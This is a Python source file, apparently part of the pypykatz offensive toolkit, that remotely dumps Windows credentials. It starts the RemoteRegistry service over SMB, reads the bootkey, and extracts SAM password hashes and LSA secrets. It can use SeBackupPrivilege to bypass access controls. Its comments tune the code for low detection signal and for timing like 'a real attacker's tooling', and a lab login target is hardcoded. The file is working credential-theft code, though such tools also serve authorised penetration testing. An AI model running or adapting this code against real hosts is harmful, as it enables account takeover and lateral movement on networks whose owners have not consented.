#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import json
import asyncio
from aiosmb.commons.connection.factory import SMBConnectionFactory
from aiosmb.commons.interfaces.machine import SMBMachine
from aiosmb.dcerpc.v5.interfaces.remoteregistry import RRPRPC, SMBWinRegHive

from pypykatz.registry import logger
from pypykatz.commons.common import UniversalEncoder
from pypykatz.registry.sam.asam import *
from pypykatz.registry.security.asecurity import *
from pypykatz.registry.system.asystem import *
from pypykatz.registry.software.asoftware import *

async def print_cb(data):
	print(data)

def _is_access_denied(exc) -> bool:
	"""Whether an RRP failure is an authorization denial.

	Read off the DCE/RPC error code when the exception carries one, and off
	its text otherwise: the RRP layer surfaces the same condition as a
	``DCERPCException`` whose message ends in ``rpc_s_access_denied`` and as a
	session error carrying code 5, and this has to recognise both to decide
	whether the privilege bypass is worth trying.
	"""
	for attr in ('error_code', 'errorCode'):
		code = getattr(exc, attr, None)
		if isinstance(code, int) and code == 5:
			return True
	text = str(exc).lower()
	return 'access_denied' in text or 'access denied' in text


class RemoteRegistry:
	"""
	This class represents an offline registry
	You will need to set at least the SYSTEM hive (to get bootkey)
	In case you have the SAM and/or SECURITY hives, it will parse them for the stored credentials/secrets as well.
	"""
	def __init__(self, connection, print_cb = print_cb, backup_mode = False, want_sam = True, want_lsa = True):
		# backup_mode: open SAM/SECURITY/SYSTEM/SOFTWARE via SeBackupPrivilege
		# (REG_OPTION_BACKUP_RESTORE) instead of the SetKeySecurity DACL dance —
		# no hive written to disk, no ADMIN$, no DACL change, and works for a
		# Backup Operator. Default False keeps the legacy DACL behaviour.
		#
		# want_sam / want_lsa (default True/True preserves the original
		# always-open-all-four-hives behaviour for every existing caller):
		# a caller that only needs ONE of SAM/LSA can skip the hive-open
		# round trip(s) for the other, and -- more importantly -- the
		# bootkey read (get_secrets' first real operation on the SYSTEM
		# hive) happens right after the SYSTEM hive alone is opened, not
		# after SAM+SECURITY+SOFTWARE are also opened first. Fewer backup-
		# mode registry opens before the bootkey read is both lower-
		# footprint and closer to how a real attacker's tooling (impacket's
		# RemoteOperations.getBootKey(), which opens nothing but the LSA
		# subkeys before reading the bootkey) sequences the same read.
		self.backup_mode = backup_mode
		self.want_sam = want_sam
		self.want_lsa = want_lsa
		self.print_cb = print_cb
		self.connection = connection
		self.rrprpc = None
		self.sam_hive = None
		self.security_hive = None
		self.system_hive = None
		self.software_hive = None

		self.system = None
		self.sam = None
		self.security = None
		self.software = None
	
	@staticmethod
	async def from_url(url:str):
		connection_factory = SMBConnectionFactory.from_url(url)
		connection = connection_factory.get_connection()
		_, err = await connection.login()
		if err is not None:
			raise err

		return await RemoteRegistry.from_smb_connection(connection)
	
	@staticmethod
	async def from_smb_connection(connection, backup_mode = False):
		po = RemoteRegistry(connection, backup_mode = backup_mode)
		return po
		
	async def get_secrets(self):

		machine = SMBMachine(self.connection)
		await self.print_cb('[+] Enabling RemoteRegistry service...')
		_, err = await machine.enable_service('RemoteRegistry')
		if err is not None:
			# A Backup Operators member (or any principal without SCManager
			# rights) cannot call StartService -- that is a SEPARATE
			# privilege from SeBackupPrivilege (the one backup_mode's
			# registry OPENS actually need). This is NON-FATAL: connecting
			# to \pipe\winreg below triggers Windows' own automatic
			# (trigger-start) service start without needing SCManager
			# access, exactly like ADscan's own hive-to-disk export fallback
			# already tolerates this (see native_dump_service.py
			# _save_hive_backup_restore's "SCM start denied -- will rely on
			# \pipe\winreg trigger-start" comment). Only raise if the
			# connect-retry loop below genuinely never reaches the service.
			await self.print_cb('[+] SCM start denied (%s) -- will rely on \\pipe\\winreg trigger-start' % err)

		# Match impacket's own timing (examples/secretsdump.py
		# RemoteOperations.__checkServiceStatus): a SINGLE ~1s wait right
		# after triggering the service start, before the FIRST connect
		# attempt -- not a 4s wait repeated up to 5 times. The 5-attempt
		# retry loop stays as a safety net for a genuinely slow start, but
		# only the fallback attempts (after the first) use the longer 4s
		# wait; the common case (service already running or starts quickly)
		# now waits as long as a real attacker's tooling would, not up to
		# 4x longer for no reason.
		err = None
		for i in range(5):
			await self.print_cb('[+] Waiting for service to start...')
			await asyncio.sleep(1 if i == 0 else 4)
			await self.print_cb('[+] Connecting to RemoteRegistry service... Attempt %s' % (i+1))
			self.rrprpc, err = await RRPRPC.from_smbconnection(self.connection)
			if err is not None:
				continue
			break
		else:
			raise Exception('Could not connect to RemoteRegistry service!')
		
		await self.print_cb('[+] Connected to RemoteRegistry service')
		try:
			# SYSTEM hive: always a genuinely PLAIN open (plain_mode), never
			# backup_mode, regardless of what the caller requested for the
			# protected hives below. SYSTEM's DACL is permissive enough that
			# any admin/Backup-Operator read already works unprivileged --
			# confirmed live 2026-10-07 on a GOAD DC -- so there is no reason
			# to ever request REG_OPTION_BACKUP_RESTORE here; doing so was
			# simply extra, avoidable attacker-tooling signal for a hive that
			# never needed it. SAM/SECURITY/SOFTWARE keep self.backup_mode
			# unchanged: their protected secret data (SAM's F/V values,
			# SECURITY's Policy\Secrets\*/Cache) is ERROR_ACCESS_DENIED to
			# EVERY principal -- Domain Admin included -- without the
			# privilege bypass, so there is no admin-vs-non-admin distinction
			# to exploit there; see SMBWinRegHive's backup_mode docstring.
			self.system_hive = SMBWinRegHive(self.rrprpc, 'HKLM\\SYSTEM', print_cb = self.print_cb, plain_mode = True)
			await self.system_hive.setup()

			# Read the bootkey IMMEDIATELY after opening the SYSTEM hive alone --
			# before SAM/SECURITY/SOFTWARE are ever opened. See the want_sam/
			# want_lsa comment in __init__ for why this ordering matters.
			await self.print_cb('[+] Parsing SYSTEM hive...')
			self.system = SYSTEM(self.system_hive)
			try:
				bootkey = await self.system.get_bootkey()
			except Exception as plain_exc:
				# The plain SYSTEM open is the OPSEC-preferred path and it is
				# genuinely enough on some DCs, which is where it was measured.
				# It is NOT universal: on another DC a Backup Operators member
				# is ERROR_ACCESS_DENIED on the bootkey class reads
				# (ControlSet001\Control\Lsa\{JD,Skew1,GBG,Data}), because
				# that principal's access to them comes from
				# SeBackupPrivilege and not from the hive's DACL. Hardcoding
				# plain_mode therefore turned "lower signal where it works"
				# into "the technique fails outright" for exactly the role
				# whose whole power is the privilege bypass.
				#
				# Two references agree, and both were checked rather than
				# reasoned about. The standard tooling's own Backup Operators
				# module reads these four class fields with
				# REG_OPTION_BACKUP_RESTORE|REG_OPTION_OPEN_LINK and
				# KEY_READ, never a plain open, and falls back to saving the
				# whole SYSTEM hive when that fails. And ADscan before the
				# inline path existed opened this hive in the DEFAULT mode
				# (the open-then-SetKeySecurity DACL dance) and reached the
				# secrets, so the plain open is a strictly narrower request
				# than anything that previously worked here.
				#
				# The recovery is backup_mode rather than that DACL dance:
				# same effective access, without modifying a key's security
				# descriptor on the client's DC, which is an environment
				# change with a cleanup obligation. Plain stays FIRST so the
				# measured low-signal path keeps its win on the hosts where
				# it suffices, and the extra denied open is paid only where
				# it does not. A fresh SYSTEM object is built because the old
				# one holds a half-read bootkey accumulator.
				if not self.backup_mode or not _is_access_denied(plain_exc):
					raise
				await self.print_cb(
					'[+] SYSTEM bootkey denied on the plain open (%s) -- '
					'reopening SYSTEM with SeBackupPrivilege' % plain_exc
				)
				try:
					await self.system_hive.close()
				except Exception:
					pass
				self.system_hive = SMBWinRegHive(self.rrprpc, 'HKLM\\SYSTEM', print_cb = self.print_cb, backup_mode = True)
				await self.system_hive.setup()
				self.system = SYSTEM(self.system_hive)
				bootkey = await self.system.get_bootkey()
			await self.system.get_secrets()

			if self.want_sam:
				self.sam_hive = SMBWinRegHive(self.rrprpc, 'HKLM\\SAM', print_cb = self.print_cb, backup_mode = self.backup_mode)
				await self.sam_hive.setup()

				await self.print_cb('[+] Parsing SAM hive...')
				self.sam = SAM(self.sam_hive, bootkey)
				await self.sam.get_secrets()

			if self.want_lsa:
				self.security_hive = SMBWinRegHive(self.rrprpc, 'HKLM\\SECURITY', print_cb = self.print_cb, backup_mode = self.backup_mode)
				await self.security_hive.setup()

				await self.print_cb('[+] Parsing SECURITY hive...')
				self.security = SECURITY(self.security_hive, bootkey, self.system)
				await self.security.get_secrets()

				self.software_hive = SMBWinRegHive(self.rrprpc, 'HKLM\\SOFTWARE', print_cb = self.print_cb, backup_mode = self.backup_mode)
				await self.software_hive.setup()

				await self.print_cb('[+] Parsing SOFTWARE hive...')
				self.software = SOFTWARE(self.software_hive, bootkey)
				await self.software.get_default_logon()

				if self.software.default_logon_user is not None:
					self.security.set_default_user(self.software.default_logon_user, self.software.default_logon_domain)

		except Exception as e:
			import traceback
			traceback.print_exc()
			raise e
		finally:
			await self.print_cb('[+] Closing remote hives...')
			for hive in [self.system_hive, self.sam_hive, self.security_hive, self.software_hive]:
				if hive is None:
					continue
				try:
					await hive.close()
				except:
					pass
			await self.print_cb('[+] Done!')
		
	def to_file(self, file_path, json_format = False):
		with open(file_path, 'a', newline = '') as f:
			if json_format == False:
				f.write(str(self))
			else:
				f.write(self.to_json())
	
	def to_json(self):
		return json.dumps(self.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True)
			
	def to_dict(self):
		t = {}
		t['SYSTEM'] = self.system.to_dict()
		if self.sam:
			t['SAM'] = self.sam.to_dict()
		if self.security:
			t['SECURITY'] = self.security.to_dict()
		if self.software:
			t['SOFTWARE'] = self.software.to_dict()
		return t
		
		
	def __str__(self):
		t = str(self.system)
		if self.sam:
			t += str(self.sam)
		if self.security:
			t += str(self.security)
		if self.software:
			t += str(self.software)
		return t

async def amain():
	import logging
	logger.setLevel(logging.DEBUG)
	url = 'smb2+ntlm-password://vagrant:vagrant@192.168.56.11'
	po = await RemoteRegistry.from_url(url)
	await po.get_secrets()
	print(str(po))

def main():
	import asyncio
	asyncio.run(amain())
	
if __name__ == '__main__':
	main()